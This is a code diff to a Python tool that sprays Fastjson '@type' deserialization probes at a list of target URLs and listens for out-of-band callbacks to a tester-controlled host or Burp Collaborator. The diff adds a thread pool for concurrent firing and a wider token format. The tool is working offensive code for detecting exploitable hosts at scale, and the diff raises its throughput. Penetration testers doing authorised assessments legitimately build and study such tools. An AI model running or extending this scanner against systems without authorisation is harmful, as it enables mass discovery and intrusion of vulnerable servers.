@@ -25,7 +25,7 @@ IPv4/Collaborator subdomains are auto-encoded to a decimal integer; correlation 
 by the unique URL PATH token (Burp shows it). See fjpayload.py header for detail.
 Authorized use only.
 """
-import argparse, http.server, ipaddress, os, socket, sys, threading, time, urllib.request
+import argparse, concurrent.futures, http.server, ipaddress, os, socket, sys, threading, time, urllib.request
 
 HITS = {}   # token -> list of (client_ip, request_line)
 LOCK = threading.Lock()
@@ -137,6 +137,7 @@ def main(argv):
     ap.add_argument("--target-port", type=int, default=None, help="port for bare-domain targets")
     ap.add_argument("--path", default="/parse", help="path for bare-domain targets (default /parse)")
     ap.add_argument("--method", default="POST", help="default HTTP method (default POST)")
+    ap.add_argument("--threads", type=int, default=20, help="concurrent request workers (default 20)")
     ap.add_argument("--content-type", default="application/json")
     ap.add_argument("--wrap", default="{{P}}", help="body template; {{P}} = the probe object")
     ap.add_argument("--timeout", type=float, default=8.0)
@@ -156,14 +157,26 @@ def main(argv):
 
     targets = load_targets(args.targets, args.scheme, args.target_port, args.path, args.method)
     token_map = {}
-    print(f"[*] firing {len(targets)} target(s)\n")
+    jobs = []
     for i, (method, url) in enumerate(targets):
-        token = "fj%02x%s" % (i, os.urandom(3).hex())
+        token = "fj%04x%s" % (i & 0xffff, os.urandom(3).hex())
         obj = '{"@type":"%s","x":1}' % make_type(host, port, token)
         body = args.wrap.replace("{{P}}", obj)
         token_map[token] = (method, url)
+        jobs.append((token, method, url, body))
+
+    workers = max(1, min(args.threads, len(jobs) or 1))
+    print(f"[*] firing {len(jobs)} target(s) with {workers} thread(s)\n")
+    plock = threading.Lock()
+
+    def fire(job):
+        token, method, url, body = job
         status = send(method, url, body, args.content_type, args.timeout)
-        print(f"    [{token}] {method} {url}  -> {status}")
+        with plock:
+            print(f"    [{token}] {method} {url}  -> {status}")
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as pool:
+        list(pool.map(fire, jobs))
 
     if srv:
         print(f"\n[*] waiting {args.wait}s for callbacks ...")
